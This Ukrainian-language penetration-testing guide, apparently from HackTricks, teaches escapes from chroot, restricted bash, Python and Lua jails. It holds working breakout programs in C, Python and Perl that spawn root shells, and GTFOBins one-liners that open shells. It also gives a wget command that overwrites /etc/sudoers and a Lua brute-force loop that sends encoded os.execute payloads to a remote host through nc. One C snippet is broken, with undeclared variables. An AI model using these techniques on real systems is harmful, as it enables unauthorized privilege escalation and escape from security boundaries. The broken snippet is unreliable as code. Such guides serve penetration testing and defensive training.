# Втеча з Jails

## **GTFOBins**

**Перевірте** [**https://gtfobins.github.io/**](https://gtfobins.github.io) **чи можете ви виконати будь-який binary із властивістю "Shell"**

## Втеча з Chroot

З [wikipedia](https://en.wikipedia.org/wiki/Chroot#Limitations): Механізм chroot **не призначений для захисту** від навмисного втручання з боку **привілейованих** (**root**) **користувачів**. У більшості систем контексти chroot некоректно вкладаються, і програми в chroot **із достатніми привілеями можуть виконати другий chroot, щоб вирватися назовні**.\
Зазвичай це означає, що для втечі вам потрібно бути root усередині chroot.<sup>[[4]](#references)</sup>

> [!TIP]
> **Інструмент** [**chw00t**](https://github.com/earthquake/chw00t) було створено для зловживання такими сценаріями та втечі з `chroot`.<sup>[[1]](#references)[[5]](#references)</sup>

### Root + CWD

> [!WARNING]
> Якщо ви **root** усередині chroot, ви **можете втекти**, створивши **інший chroot**. Це відбувається тому, що 2 chroot не можуть співіснувати (у Linux), тож якщо ви створите папку, а потім **створите новий chroot** у цій новій папці, перебуваючи **за її межами**, ви опинитеся **за межами нового chroot** і, отже, у FS.
>
> Це відбувається тому, що зазвичай chroot НЕ переміщує ваш робочий каталог до вказаного, тому ви можете створити chroot, але залишитися за його межами.<sup>[[4]](#references)[[5]](#references)</sup>

Зазвичай ви не знайдете binary `chroot` усередині chroot jail, але ви **можете скомпілювати, завантажити та виконати** binary:

<details>

<summary>C: break_chroot.c</summary>
```c
#include <sys/stat.h>
#include <stdlib.h>
#include <unistd.h>

//gcc break_chroot.c -o break_chroot

int main(void)
{
mkdir("chroot-dir", 0755);
chroot("chroot-dir");
for(int i = 0; i < 1000; i++) {
chdir("..");
}
chroot(".");
system("/bin/bash");
}
```
</details>

<details>

<summary>Python</summary>
```python
#!/usr/bin/python
import os
os.mkdir("chroot-dir")
os.chroot("chroot-dir")
for i in range(1000):
os.chdir("..")
os.chroot(".")
os.system("/bin/bash")
```
</details>

<details>

<summary>Perl</summary>
```perl
#!/usr/bin/perl
mkdir "chroot-dir";
chroot "chroot-dir";
foreach my $i (0..1000) {
chdir ".."
}
chroot ".";
system("/bin/bash");
```
</details>

### Root + Saved fd

> [!WARNING]
> Це схоже на попередній випадок, але цього разу **attacker зберігає file descriptor до поточного каталогу**, а потім **створює chroot у новій папці**. Зрештою, оскільки він має **access** до цього **FD** **поза** chroot, він отримує до нього доступ і **escapes**.<sup>[[4]](#references)[[5]](#references)</sup>

<details>

<summary>C: break_chroot.c</summary>
```c
#include <sys/stat.h>
#include <stdlib.h>
#include <unistd.h>

//gcc break_chroot.c -o break_chroot

int main(void)
{
mkdir("tmpdir", 0755);
dir_fd = open(".", O_RDONLY);
if(chroot("tmpdir")){
perror("chroot");
}
fchdir(dir_fd);
close(dir_fd);
for(x = 0; x < 1000; x++) chdir("..");
chroot(".");
}
```
</details>

### Root + Fork + UDS (Unix Domain Sockets)

> [!WARNING]
> FD можна передавати через Unix Domain Sockets, тому:
>
> - Створіть дочірній процес (fork)
> - Створіть UDS, щоб батьківський і дочірній процеси могли взаємодіяти
> - Виконайте chroot у дочірньому процесі в іншій папці
> - У батьківському процесі створіть FD папки, яка знаходиться за межами chroot нового дочірнього процесу
> - Передайте цей FD дочірньому процесу за допомогою UDS
> - Дочірній процес виконає chdir до цього FD, і оскільки він знаходиться за межами його chroot, процес вийде з jail.<sup>[[5]](#references)[[6]](#references)</sup>

### Root + Mount

> [!WARNING]
>
> - Змонтуйте кореневий пристрій (/) у директорію всередині chroot
> - Виконайте chroot у цю директорію
>
> Це можливо в Linux.<sup>[[5]](#references)</sup>

### Root + /proc

> [!WARNING]
>
> - Змонтуйте procfs у директорію всередині chroot (якщо він ще не змонтований)
> - Знайдіть pid, який має інший запис root/cwd, наприклад: /proc/1/root
> - Виконайте chroot до цього запису.<sup>[[4]](#references)[[5]](#references)[[7]](#references)</sup>

### Root(?) + Fork

> [!WARNING]
>
> - Створіть Fork (дочірній процес), виконайте chroot в іншу папку глибше у FS та виконайте CD до неї
> - У батьківському процесі перемістіть папку, у якій знаходиться дочірній процес, у папку, що розташована перед chroot дочірнього процесу
> - Цей дочірній процес опиниться за межами chroot.<sup>[[5]](#references)</sup>

### ptrace

> [!WARNING]
>
> - Можливість процесу під'єднатися за допомогою `ptrace` залежить від облікових даних, capabilities та увімкнених security modules, таких як Yama; тому debugging процесів того самого користувача може бути обмежений політикою системи.<sup>[[8]](#references)</sup>
> - Якщо під'єднання дозволене, можна виконати ptrace до процесу та запустити shellcode всередині нього ([див. цей приклад](../interesting-files-permissions/linux-capabilities.md#cap_sys_ptrace)).<sup>[[5]](#references)[[8]](#references)</sup>

## Bash Jails

### Перерахування

Отримайте інформацію про jail:
```bash
echo $0
echo $SHELL
echo $PATH
env
export
pwd
set -o
compgen -c | sort -u
enable -a
type -a bash sh rbash ssh vi vim less more man awk find tar zip git scp script 2>/dev/null
```
### Зміна PATH

Перевірте, чи можете ви змінити змінну середовища PATH.<sup>[[2]](#references)</sup>
```bash
echo $PATH #See the path of the executables that you can use
PATH=/usr/local/sbin:/usr/sbin:/sbin:/usr/local/bin:/usr/bin:/bin #Try to change the path
echo /home/* #List directory
```
### Використання vim

Якщо Vim доступний, встановіть для його параметра `shell` оболонку, яку можна виконати, і викличте `:shell`.<sup>[[10]](#references)</sup>
```bash
:set shell=/bin/sh
:shell
```
### Пейджери та переглядачі довідки

У багатьох обмежених середовищах усе ще доступні **пейджери** або **переглядачі довідки**. Зазвичай їх швидше використати зловмисно, ніж намагатися відновити `PATH`.
```bash
less /etc/hosts
!/bin/sh

man man
!/bin/sh

man '-H/bin/sh #' man
```
Якщо доступний `git`, його параметр `--paginate` надсилає вивід до `less` або `$PAGER`, що корисно, якщо доступне escape-перемикання pager.<sup>[[9]](#references)</sup>
```bash
PAGER='/bin/sh -c "exec sh 0<&1"' git -p help
# Or: git help config
# Then inside the pager: !/bin/sh
```
### Поширені однорядкові команди GTFOBins

Після визначення доступних бінарних файлів спочатку перевірте очевидні shell-спавнери:
```bash
awk 'BEGIN {system("/bin/sh")}'
find . -exec /bin/sh \; -quit
tar -cf /dev/null /dev/null --checkpoint=1 --checkpoint-action=exec=/bin/sh
zip /tmp/zip.zip /etc/hosts -T --unzip-command='sh -c /bin/sh'
script /dev/null -c bash
ssh localhost /bin/sh
```
Якщо ви можете лише **впроваджувати аргументи** в дозволену команду (замість вільного її запуску), також перевірте **GTFOArgs**.<sup>[[17]](#references)</sup>

### Створення скрипту

Перевірте, чи можете ви створити виконуваний файл із вмістом _/bin/bash_
```bash
red /bin/bash
> w wx/path #Write /bin/bash in a writable and executable path
```
### Отримання bash через SSH

Якщо ви отримуєте доступ через ssh, часто можна попросити сервер виконати **іншу програму** замість обмеженої оболонки входу.<sup>[[14]](#references)</sup>
```bash
ssh -t user@<IP> bash # Get directly an interactive shell
ssh user@<IP> -t "/bin/sh"
ssh user@<IP> -t "bash --noprofile -i"
ssh user@<IP> -t "() { :; }; sh -i "
```
Якщо `ssh` є одним із небагатьох локально дозволених бінарних файлів, пам’ятайте, що його також можна зловживати як **GTFOBin**; його параметри `LocalCommand` і `ProxyCommand` виконують локально налаштовані допоміжні команди.<sup>[[14]](#references)[[15]](#references)</sup>
```bash
ssh localhost /bin/sh
ssh -o PermitLocalCommand=yes -o LocalCommand=/bin/sh localhost
ssh -o ProxyCommand=';/bin/sh 0<&2 1>&2' x
```
### Declare

У Bash `nameref` перенаправляє присвоєння до іншої змінної, а додавання елемента до `BASH_CMDS` додає цю команду до внутрішньої хеш-таблиці команд Bash.<sup>[[11]](#references)[[12]](#references)</sup>
```bash
declare -n PATH; export PATH=/bin;bash -i

BASH_CMDS[shell]=/bin/bash;shell -i
```
### Wget

Опція `-O` у Wget записує завантажений вміст у вказаний вихідний файл; якщо цей шлях доступний для запису, це може перезаписати такий файл, як `/etc/sudoers`.<sup>[[13]](#references)</sup>
```bash
wget http://127.0.0.1:8080/sudoers -O /etc/sudoers
```
### Обмежені shell-обгортки (`git-shell`, `rssh`, `lshell`)

У деяких середовищах ви потрапляєте не у звичайний `rbash`, а в **обгортки**, такі як `git-shell`, `rssh` або `lshell`:

- `git-shell` приймає лише серверні Git-команди, а також будь-які команди, розміщені в `~/git-shell-commands/`. Якщо цей каталог існує, виконайте `help`, щоб перелічити доступні користувацькі дії. Якщо ви можете **записувати** в нього, будь-який виконуваний файл, розміщений у цьому каталозі, стає доступним.<sup>[[3]](#references)</sup>
- `rssh` / `lshell` зазвичай дозволяють лише операції `scp`, `sftp`, `rsync` або Git-стилю. У таких випадках спочатку зосередьтеся на **примітивах запису файлів**: завантажте `authorized_keys`, startup-файл shell або допоміжний скрипт у доступне для запису місце, а потім повторно підключіться за допомогою `ssh -t ...`.
- Якщо обгортка лише фільтрує командний рядок, перелічіть доступні бінарні файли, а потім поверніться до **GTFOBins / GTFOArgs**.

### Інші прийоми

Також перевірте:

- [**Fireshell Security - Restricted Linux Shell Escaping Techniques**](https://fireshellsecurity.team/restricted-linux-shell-escaping-techniques/)
- [**SANS - Escaping Restricted Linux Shells**](https://www.sans.org/blog/escaping-restricted-linux-shells)
- [**GTFOBins**](https://gtfobins.org/)
- [**GTFOArgs**](https://gtfoargs.github.io/)

**Також може бути цікавою ця сторінка:**

{{#ref}}
../linux-basics/bypass-linux-restrictions/
{{#endref}}

## Python Jails

Прийоми виходу з Python jails наведено на такій сторінці:


{{#ref}}
../../generic-methodologies-and-resources/python/bypass-python-sandboxes/
{{#endref}}

## Lua Jails

На цій сторінці можна знайти глобальні функції, доступні всередині Lua: [https://www.gammon.com.au/scripts/doc.php?general=lua_base](https://www.gammon.com.au/scripts/doc.php?general=lua_base).<sup>[[16]](#references)</sup>

Стандартні функції `load`, `string.char` і `os.execute` можуть створювати та виконувати цей фрагмент, якщо вони доступні.<sup>[[16]](#references)</sup>
```bash
load(string.char(0x6f,0x73,0x2e,0x65,0x78,0x65,0x63,0x75,0x74,0x65,0x28,0x27,0x6c,0x73,0x27,0x29))()
```
Функцію таблиці також можна отримати за допомогою `rawget`, а не синтаксису з крапкою.<sup>[[16]](#references)</sup>
```bash
print(string.char(0x41, 0x42))
print(rawget(string, "char")(0x41, 0x42))
```
Використовуйте `pairs`, щоб перелічити таблицю бібліотеки.<sup>[[16]](#references)</sup>
```bash
for k,v in pairs(string) do print(k,v) end
```
Порядок, у якому `pairs` перераховує індекси таблиці, не визначений, тому не покладайтеся на те, що певна функція з’явиться першою. Якщо потрібно виконати одну конкретну функцію, можна здійснити brute force attack, завантажуючи різні Lua environments і викликаючи першу функцію бібліотеки.<sup>[[16]](#references)</sup>
```bash
#In this scenario you could BF the victim that is generating a new lua environment
#for every interaction with the following line and when you are lucky
#the char function is going to be executed
for k,chr in pairs(string) do print(chr(0x6f,0x73,0x2e,0x65,0x78)) end

#This attack from a CTF can be used to try to chain the function execute from "os" library
#and "char" from string library, and the use both to execute a command
for i in seq 1000; do echo "for k1,chr in pairs(string) do for k2,exec in pairs(os) do print(k1,k2) print(exec(chr(0x6f,0x73,0x2e,0x65,0x78,0x65,0x63,0x75,0x74,0x65,0x28,0x27,0x6c,0x73,0x27,0x29))) break end break end" | nc 10.10.10.10 10006 | grep -A5 "Code: char"; done
```
**Отримання interactive lua shell**: Якщо ви перебуваєте в обмеженому lua shell, ви можете отримати новий lua shell (і, сподіваємося, необмежений), викликавши `debug.debug()`, що переходить в інтерактивний режим.<sup>[[16]](#references)</sup>
```bash
debug.debug()
```
## References

- [1] [Chw00t: Як втекти з різних chroot-рішень (Bucsay Balazs, доповідь і слайди DeepSec)](https://www.youtube.com/watch?v=UO618TeyCWo)
- [2] [Довідковий посібник GNU Bash – Restricted Shell](https://www.gnu.org/software/bash/manual/html_node/The-Restricted-Shell.html)
- [3] [git-shell – Документація Git](https://git-scm.com/docs/git-shell)
- [4] [chroot(2) – сторінка посібника Linux](https://man7.org/linux/man-pages/man2/chroot.2.html)
- [5] [chw00t – інструмент для escape з chroot](https://github.com/earthquake/chw00t)
- [6] [unix(7) – сторінка посібника Linux](https://man7.org/linux/man-pages/man7/unix.7.html)
- [7] [proc_pid_root(5) – сторінка посібника Linux](https://man7.org/linux/man-pages/man5/proc_pid_root.5.html)
- [8] [ptrace(2) – сторінка посібника Linux](https://man7.org/linux/man-pages/man2/ptrace.2.html)
- [9] [git – Документація Git](https://git-scm.com/docs/git)
- [10] [:shell – документація Vim](https://vimhelp.org/various.txt.html#%3Ashell)
- [11] [Вбудовані команди Bash – Довідковий посібник GNU Bash](https://www.gnu.org/software/bash/manual/html_node/Bash-Builtins.html)
- [12] [Змінні Bash – Довідковий посібник GNU Bash](https://www.gnu.org/software/bash/manual/html_node/Bash-Variables.html)
- [13] [Довідковий посібник GNU Wget](https://www.gnu.org/software/wget/manual/wget.html)
- [14] [ssh(1) – сторінка посібника OpenBSD](https://man.openbsd.org/ssh)
- [15] [ssh_config(5) – сторінка посібника OpenBSD](https://man.openbsd.org/ssh_config)
- [16] [Довідковий посібник Lua 5.4](https://www.lua.org/manual/5.4/manual.html)
- [17] [GTFOArgs: список векторів експлуатації ін'єкції аргументів](https://gtfoargs.github.io/)
{{#include ../../banners/hacktricks-training.md}}
